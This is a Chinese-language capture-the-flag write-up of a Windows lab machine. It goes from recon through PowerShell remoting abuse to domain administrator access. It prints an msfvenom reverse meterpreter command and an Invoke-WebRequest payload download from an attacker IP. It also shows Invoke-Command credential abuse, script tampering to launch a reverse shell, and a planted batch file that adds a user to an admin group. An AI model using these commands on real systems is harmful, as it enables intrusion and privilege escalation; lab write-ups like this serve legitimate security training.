# 前言

这是一台纯Windows渗透的靶机，通过powershell的各种命令实现从一个低权限用户提权到一个高权限用户的过程。除此之外，这是一台很好的内网靶机，通过这台靶机可以学习到很多内网渗透的姿势。

# 解题思路

![image](https://image.3001.net/images/20220428/1651109629_6269eefd781e30e454f31.png!small)

# 信息收集

对目标靶机进行扫描时发现只开放了443端口，很奇怪。但是我们发现了一个域名地址，我们可以尝试添加到hosts文件中进行访问  
![image.png](https://image.3001.net/images/20220406/1649253995_624d9e6be6a236a5b6175.png!small)

是一个非常正常的web页面

![image.png](https://image.3001.net/images/20220406/1649254267_624d9f7b16b07a31b586c.png!small)

浏览`about us`页面时，发现很多人名，编辑将其保存为users.txt文件

![image.png](https://image.3001.net/images/20220427/1651043030_6268ead648797df24d418.png!small)

![image.png](https://image.3001.net/images/20220427/1651043068_6268eafc7f31027d3eb1d.png!small)

在关于页面上下载一个doc文档查看是否存在有价值的信息

![image.png](https://image.3001.net/images/20220428/1651108430_6269ea4e9a2e8745019b8.png!small)

在查找信息时，发现存在一个默认密码和一个`remote`远程地址

![image.png](https://image.3001.net/images/20220428/1651108620_6269eb0c075c4278d14d5.png!small)

![image.png](https://image.3001.net/images/20220428/1651108655_6269eb2fd21858752aa97.png!small)

新的链接地址是一个登录表单

![image.png](https://image.3001.net/images/20220428/1651109584_6269eed0f381636d13cf7.png!small)

可以通过前期整理的用户名和密码进行尝试，但是这里发现需要填写计算机名，可以使用`exiftool`工具找到计算机名

![image.png](https://image.3001.net/images/20220428/1651110060_6269f0ac0d93b09e8dd4a.png!small)

最后使用`Edavies`这个账户登录成功，登录成功后发现是一个powershell界面

![image.png](https://image.3001.net/images/20220428/1651110209_6269f141141eb5567107c.png!small)

# 漏洞利用

查看到计算机上除了`Edavies`这个用户外，还存在其他用户。这些用户可能都存在不用的权限，因此下一步要做的就是横向到这各个用户上去。

![image.png](https://image.3001.net/images/20220428/1651110376_6269f1e8e23082b4c12a5.png!small)

因此漏洞利用的思路就出来了，可以生成一个远控shell，投毒到当前靶机上接收它的shell终端

    
    
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
    

![image.png](https://image.3001.net/images/20220428/1651110670_6269f30e390b7ebadad1b.png!small)

要下载这个payload，就要用到powershell的远程下载命令了，同时MSF那边开启监听

    
    
    Invoke-WebRequest "http://10.10.14.5/shell.exe" -OutFile "shell.exe"
    

![image.png](https://image.3001.net/images/20220428/1651111042_6269f482804aea8d1c591.png!small)

接收到edavies的shell终端

![image.png](https://image.3001.net/images/20220428/1651111085_6269f4ad9bc7a78035fc5.png!small)

# 提权

## edavies提权imonks

使用`screenshare`命令查看靶机正在进行什么活动，命令执行它将其保存为html文件

![image.png](https://image.3001.net/images/20220428/1651111764_6269f754230f34903d065.png!small)

发现目标主机正在执行如下的命令操作，从这些信息中可以获取到密码，用户的认证凭证等信息

![image](https://image.3001.net/images/20220428/1651111944_6269f8086fe72982ebeb7.jpg!small)

![image](https://image.3001.net/images/20220428/1651111953_6269f811ce9e895b9415d.jpg!small)

得到这些信息后，只需要配合`Invoke-Command`命令并执行相同的操作，那么就可以获取到`imonks`用户的权限了

    
    
    $passwd = ConvertTo-SecureString "w3_4R3_th3_f0rce" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("acute\imonks",$passwd)
    Invoke-Command -computerName atsserver -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred
    

![image.png](https://image.3001.net/images/20220428/1651129788_626a3dbc6bdb42de16a5f.png!small)

有了用户密码和凭据，就可以对imonks用户的目录进行查看了

    
    
    Invoke-Command -computerName atsserver -ConfigurationName dc_manage -ScriptBlock {ls /users} -credential $cred
    

![image.png](https://image.3001.net/images/20220428/1651129976_626a3e78a43db2d1cd9b4.png!small)

## imonks提权jmorgan

在imonks的桌面目录上，除了看见user.txt文件外，还存在一个powershell脚本，脚本内容如下

    
    
    $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
    $passwd = $securepasswd | ConvertTo-SecureString
    $creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
    Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
    

从上面的脚本内容上看，脚本首先是对密码进行加密处理，然后通过验证cred变量从而去执行`Get-Volume`这个命令。想要获取到jmorgan用户的权限，就得替换掉命令里的内容，并执行属于我们自己的载荷文件。

    
    
    Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\rev.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1} -credential $cred
    

![image.png](https://image.3001.net/images/20220428/1651131660_626a450cdf3a3203c026f.png!small)

## jmorgan提权Administrator

得到jmorgan用户的权限后，可以查看该用户是否在管理员组中

![image.png](https://image.3001.net/images/20220428/1651131781_626a4585c3c7cc2a8cf8e.png!small)

很幸运，jmorgan用户是处于管理员组中，那么就可以对Administraor用户进行hash dump，解密出密码是`Password@123`

![image.png](https://image.3001.net/images/20220428/1651131897_626a45f952afa188edc50.png!small)

![image.png](https://image.3001.net/images/20220428/1651131965_626a463d4831daccfa258.png!small)

但是很可惜的是，当尝试使用这个密码去登录管理员的时候，是失败的。那么这里就要用到密码重用技术，类似于尝试使用同一个密码去登录不同的用户

![image.png](https://image.3001.net/images/20220428/1651133566_626a4c7e1c5ec64f6d719.png!small)

    
    
    $passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("acute\awallace", $passwd)
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
    

![image.png](https://image.3001.net/images/20220428/1651135436_626a53cc4c14c48320956.png!small)

显示登录成功，接着可以查看这个用户对应的目录文件，可以看到里面存在一个keepmeon目录

![image.png](https://image.3001.net/images/20220428/1651135674_626a54baa5cf4ed2916b3.png!small)

里面存在一个bat脚本，这个脚本的作用是每5分钟运行一次

    
    
    REM This is run every 5 minutes. For Lois use ONLY
    @echo off
     for /R %%x in (*.bat) do (
     if not "%%x" == "%~0" call "%%x"
    )
    

![image.png](https://image.3001.net/images/20220428/1651135769_626a551918f180602f677.png!small)

那么思路就是，只要把这个脚本加到计划任务上。等待5分钟后执行这个脚本，并awallace用户添加到site_admin管理员组上

    
    
    Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {net group site_admin} -credential $cred
    

![image.png](https://image.3001.net/images/20220428/1651139764_626a64b46eb27351c215f.png!small)

最后可以查看到Administrator账户里的目录文件信息了

![image.png](https://image.3001.net/images/20220428/1651139865_626a651990f0cdefb94bd.png!small)

